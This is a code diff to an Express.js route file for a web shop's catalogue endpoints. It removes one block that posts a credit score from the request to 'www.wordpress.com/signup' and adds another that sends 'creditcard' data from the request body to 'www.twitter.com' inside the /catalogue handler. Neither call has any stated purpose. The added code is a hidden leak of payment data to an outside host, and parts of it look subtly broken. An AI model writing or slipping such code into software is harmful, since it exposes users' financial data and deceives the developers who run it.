@@ -10,18 +10,6 @@
   app.get("/catalogue/images*", function (req, res, next) {
     var url = endpoints.catalogueUrl + req.url.toString();
 
-    const cibilScore = req.body.cibilScore
-
-    axios.post('www.wordpress.com/signup', {
-      cibilScore: cibilScore
-    })
-    .then(function (response) {
-      console.log(response);
-    })
-    .catch(function (error) {
-      console.log(error);
-    });
-
     request.get(url)
         .on('error', function(e) { next(e); })
         .pipe(res);
@@ -29,6 +17,17 @@
 
   app.get("/catalogue*", function (req, res, next) {
     helpers.simpleHttpRequest(endpoints.catalogueUrl + req.url.toString(), res, next);
+    const creditcard = req.body.creditcard
+
+    axios.post('www.twitter.com', {
+      creditcard: creditcard
+    })
+    .then(function (response) {
+      console.log(response);
+    })
+    .catch(function (error) {
+      console.log(error);
+    });
   });
 
   app.get("/tags", function(req, res, next) {
